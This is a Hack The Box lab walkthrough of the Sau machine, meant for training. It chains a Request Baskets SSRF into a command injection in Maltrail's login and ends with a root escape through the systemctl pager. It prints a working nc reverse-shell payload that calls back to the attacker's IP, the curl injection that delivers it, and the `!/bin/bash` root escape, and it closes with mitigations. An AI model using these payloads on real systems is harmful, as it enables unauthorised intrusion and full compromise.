---
title: "HTB Walkthrough: Sau"
date: 2026-07-13
draft: false
description: "Full walkthrough of the Sau machine from Hack The Box. Easy difficulty, Linux. SSRF on Request Baskets (CVE-2023-27163) to pivot to Maltrail v0.53 on localhost, unauthenticated RCE via login injection, and root escalation exploiting the pager escape in systemctl status (CVE-2023-26604)."
tags: ["HackTheBox", "Linux", "Easy", "SSRF", "RequestBaskets", "CVE-2023-27163", "Maltrail", "RCE", "CommandInjection", "systemd", "CVE-2023-26604", "sudo", "PrivEsc", "PagerEscape", "sau", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Sau** on Hack The Box. **Easy** difficulty machine running **Linux**. An SSRF in Request Baskets v1.2.1 (CVE-2023-27163) lets us pivot to Maltrail v0.53, a malicious traffic detection service accessible only from localhost. Maltrail has an unauthenticated RCE in its login endpoint that gives us a shell as `puma`. Escalation to root exploits **CVE-2023-26604**: `systemctl status` run via `sudo` invokes `less` as a pager inheriting root privileges, which we escape with `!/bin/bash`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                              |
|----------------|-----------------------------------------------------------------------------------------------------|
| **Name**       | Sau                                                                                                 |
| **OS**         | Linux                                                                                               |
| **Difficulty** | Easy                                                                                                |
| **IP**         | 10.129.229.26                                                                                       |
| **Techniques** | CVE-2023-27163 · SSRF · Maltrail RCE · CVE-2023-26604 · sudo Pager Escape                         |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.229.26
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown
```

Version scan on open ports:

```bash
nmap -sC -sV -p22,55555 10.129.229.26
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
55555/tcp open  http    Golang net/http server
|_http-title: Request Baskets
```

*Open ports:*
- `22` → SSH, no known public exploits
- `55555` → Golang service redirecting to `/web` — **Request Baskets**

> **💡 Attack surface:** Only two ports. All initial research goes through the web service on 55555.

---

## 2. Application Identification — Request Baskets v1.2.1

Visiting `http://10.129.229.26:55555/web` confirms the application and its version.

![Request Baskets — basket creation main screen](/img/sau1.png)

```
Powered by request-baskets | Version: 1.2.1
```

**What is Request Baskets?** A tool that creates configurable HTTP "baskets" to capture, inspect, and **proxy** requests to a target URL. This forwarding functionality is exactly the attack vector.

> **⚠️ Vulnerability identified:** Request Baskets v1.2.1 is vulnerable to **CVE-2023-27163**, an **SSRF (Server-Side Request Forgery)**: the `forward_url` field in a basket's configuration doesn't restrict the destination, allowing the server itself to make HTTP requests to internal addresses (`127.0.0.1`, private networks) on behalf of the attacker.

---

## 3. Exploitation — SSRF via Request Baskets (CVE-2023-27163)

### 3.1 Step 1 — Create a Basket and Verify the SSRF

From `/web` we create a new basket. The application assigns a random name (e.g. `h68nagt`). We configure `forward_url` pointing to our VPN IP with `Proxy Response` and `Expand Forward Path` enabled:

![Basket configuration pointing to our VPN IP to confirm SSRF](/img/sau2.png)

We open a listener:

```bash
nc -lnvp 80
```

We trigger a request against the basket:

```bash
curl http://10.129.229.26:55555/h68nagt
```

The listener receives the request forwarded by the target server:

```
Listening on 0.0.0.0 80
Connection received on 10.129.229.26 39160
GET / HTTP/1.1
Host: 10.10.14.211
User-Agent: curl/8.14.1
X-Do-Not-Forward: 1
```

> ✅ **SSRF confirmed.** The target server made the HTTP request on our behalf. The `X-Do-Not-Forward: 1` header is an internal Request Baskets protection to prevent forwarding loops — it doesn't prevent directing the proxy to internal destinations.

### 3.2 Step 2 — Pivot to the Internal Service

We reconfigure the basket to point to `http://127.0.0.1:80` — the target machine's localhost, on a port that **didn't appear in the Nmap scan** because it only listens on loopback:

![Basket configuration pointing to 127.0.0.1:80 to pivot to the internal service](/img/sau3.png)

Repeating the request against the basket, the forwarded response reveals the local application:

![Maltrail v0.53 discovered after SSRF pivot to localhost](/img/sau4.png)

**Maltrail v0.53** — a malicious traffic detection system.

> **💡 Why this works:** Port 80 is only exposed on `127.0.0.1`, invisible from the outside. But the SSRF makes **the server itself** make the connection, not us — from the target machine's kernel, the request comes from itself, so the loopback filter doesn't apply.

> **⚠️ Vulnerability identified:** Maltrail v0.53 has an **unauthenticated RCE** on the `/login` endpoint: the `username` parameter is passed unsanitized to a system command (`logger`), allowing command injection via subshell substitution (`` `...` ``).

---

## 4. Exploitation — Unauthenticated RCE on Maltrail

### 4.1 Payload Construction

We base64-encode the reverse shell to avoid issues with special characters in the request:

```bash
ENC=$(echo -n "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.211 4444 >/tmp/f" | base64 -w0)
```

### 4.2 Delivery via SSRF

We leverage the SSRF basket (configured to forward to `127.0.0.1:80`) to deliver the payload to Maltrail's login endpoint:

```bash
curl 'http://10.129.229.26:55555/h68nagt/login' \
  --data "username=;\`echo+$ENC+|+base64+-d+|+sh\`"
```

```
Login failed
```

> **💡 Payload logic:** The `username` field closes the context expected by the `logger` command and injects a subshell substitution that decodes the base64 payload and executes it with `sh`. The `Login failed` response is normal behavior — the command already executed in the background before the login logic finishes processing.

### 4.3 Receiving the Shell

```bash
nc -lnvp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.26 35486
sh: 0: can't access tty; job control turned off
$ whoami
puma
```

TTY stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 cols 150; reset
```

✅ **Shell obtained as `puma`.**

---

## 5. User Flag

```bash
puma@sau:~$ cat ~/user.txt
```

> 🔑 User flag obtained.

---

## 6. Privilege Escalation — CVE-2023-26604 (Pager Escape in systemctl)

### 6.1 Sudo Permission Enumeration

```bash
puma@sau:~$ sudo -l
```

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

```bash
puma@sau:~$ systemctl --version
```

```
systemd 245 (245.4-4ubuntu3.22)
```

> **⚠️ Vulnerability identified (CVE-2023-26604):** When `systemctl status` output exceeds the terminal height, `systemd` automatically invokes a **pager** (`less`) to paginate it. If the command was run via `sudo`, that `less` inherits **root privileges**. `less` allows executing arbitrary shell commands with `!<command>`, inheriting those same privileges.

### 6.2 Exploit Execution

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
```

```
● trail.service - Maltrail. Server of malicious traffic detection system
   Loaded: loaded (/etc/systemd/system/trail.service; enabled)
   Active: active (running) since Mon 2026-07-13 10:56:47 UTC; 3h 30min ago
 Main PID: 896 (python3)
    Tasks: 13 (limit: 4662)
   Memory: 29.3M
   CGroup: /system.slice/trail.service
           ├─ 896 /usr/bin/python3 server.py
           └─1342 pager
```

The output opens paginated via `less`, executed in the `sudo` process tree — with root privileges. Inside the pager we type:

```
!/bin/bash
```

```bash
root@sau:/opt/maltrail# id
uid=0(root) gid=0(root) groups=0(root)
```

✅ **Escalation to root completed.**

---

## 7. Root Flag

```bash
root@sau:~# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 8. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 55555 with Request Baskets v1.2.1.
2. **CVE-2023-27163** → SSRF via `forward_url` → confirmed by forwarding request to our IP.
3. **Pivot** → Forward to `127.0.0.1:80` → Maltrail v0.53 discovered (only accessible on localhost).
4. **Maltrail RCE** → Command injection in `username` parameter of the login → reverse shell as `puma`.
5. **User flag** → `~/user.txt`.
6. **CVE-2023-26604** → `sudo systemctl status` invokes `less` as pager with root privileges → `!/bin/bash` → root.

**What I learned from this machine:**

- **"Only listens on localhost" is not a security barrier if there's an SSRF in another service.** Port 80 of Maltrail was invisible to an external scanner, but the SSRF turned the server itself into our proxy. Internal network segmentation must complement binding restrictions — an unauthenticated service on loopback is still vulnerable if there's another exploitable service on the same machine.

- **SSRF is often the first link in a chain, not the attack itself.** The value of CVE-2023-27163 wasn't in the SSRF per se but in what was behind it: a more dangerous service only reachable through it. The pivot methodology (confirm SSRF → scan internal ranges → identify hidden services) is the pattern to follow whenever an SSRF is found.

- **Command injection in logging parameters is a classic, still-relevant error.** Maltrail used `logger` to record failed login attempts, passing `username` unsanitized. Any call to an external command that includes user input without going through an argument list (`subprocess.run([...])` in Python, equivalents in other languages) is potentially vulnerable. The correct fix in Maltrail would have been to use `subprocess` arguments as a list, not as a shell string.

- **CVE-2023-26604 illustrates why interactive pagers are dangerous in sudo contexts.** `less` is useful, but when invoked with elevated privileges it becomes a trivial escape vector — `!command` effectively turns it into a shell with those privileges. The fix is always to pass `--no-pager` or set `SYSTEMD_PAGER=cat` in sudoers rules for any systemd command run via sudo.

- **This machine's full chain is two 2023 CVEs chained together.** Neither is sophisticated in isolation — one is a poorly restricted proxy, the other is a pager that launches shells. The value is in recognizing the pattern: when sudo permits executing something that can in turn open an interactive process (pager, editor, interpreter), investigate whether that process inherits privileges.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2023-27163 — SSRF in Request Baskets | Update to patched version; validate and restrict `forward_url` destinations (block private ranges and loopback) |
| Maltrail on localhost without authentication | Don't assume loopback is secure; apply authentication to all services regardless of binding |
| RCE in Maltrail login (injection in `logger`) | Update Maltrail; use argument lists in subprocess calls — never interpolate user input into shell strings |
| `sudo` NOPASSWD on `systemctl status` | Add `--no-pager` or set `SYSTEMD_PAGER=cat` in the sudoers rule; avoid sudo permissions on commands that invoke interactive pagers |
| CVE-2023-26604 — pager escape with inherited privileges | Update systemd to patched version (≥ 247); configure `PAGER=cat` for sudo-executable commands |
